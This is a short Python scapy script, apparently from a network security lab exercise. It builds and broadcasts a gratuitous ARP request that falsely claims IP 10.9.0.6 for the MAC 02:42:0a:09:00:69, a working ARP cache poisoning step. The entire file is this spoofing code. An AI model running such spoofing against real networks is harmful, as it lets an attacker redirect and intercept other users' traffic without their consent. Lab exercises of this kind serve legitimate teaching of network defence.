#!/usr/bin/python3
from scapy.all import *

E = Ether(src="02:42:0a:09:00:69", dst="ff:ff:ff:ff:ff:ff")

A = ARP(hwsrc='02:42:0a:09:00:69',psrc='10.9.0.6', 
	hwdst='ff:ff:ff:ff:ff:ff', pdst='10.9.0.6')

A.op = 1 # 1 for ARP request; 2 for ARP reply

pkt = E/A
pkt.show()
sendp(pkt)

